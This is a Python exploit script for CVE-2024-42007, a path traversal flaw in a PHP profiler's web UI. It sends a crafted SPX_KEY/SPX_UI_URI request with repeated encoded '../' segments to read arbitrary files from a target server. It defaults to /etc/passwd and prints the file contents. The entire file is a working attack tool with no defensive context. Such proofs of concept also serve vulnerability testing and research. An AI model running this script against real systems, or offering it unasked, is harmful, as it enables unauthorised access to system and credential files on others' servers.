import argparse
import requests
import urllib.parse
import sys

def validate_url(target_url):
    parsed_url = urllib.parse.urlparse(target_url)
    return parsed_url.scheme in ['http', 'https']

def exploit(target_url, file_to_read, detection_string):
    traversal = "%2f.." * 18
    encoded_path = urllib.parse.quote(file_to_read)
    vuln_url = f"{target_url}/?SPX_KEY=dev&SPX_UI_URI={traversal}{encoded_path}"

    try:
        response = requests.get(vuln_url, timeout=10, verify=False)
    except Exception as e:
        print(f"[-] Error sending request: {e}")
        return None

    if response.status_code == 200 and detection_string in response.text:
        print("[+] The target is vulnerable to CVE-2024-42007!")
        return response.text
    else:
        print("[-] The target isn't vulnerable to CVE-2024-42007.")
        return None

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-42007 Exploit Script (Python 3 version)")
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g. http://192.168.59.108)')
    parser.add_argument('-f', '--file', default='/etc/passwd', help='File to read (default: /etc/passwd)')
    parser.add_argument('-d', '--detect', default='root:x:0:0:root', help='Detection string (default: root:x:0:0:root)')

    args = parser.parse_args()

    if not validate_url(args.target):
        print("[-] Invalid target URL.")
        sys.exit(1)

    result = exploit(args.target, args.file, args.detect)
    if result:
        print("[*] File contents:\n")
        print(result)

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
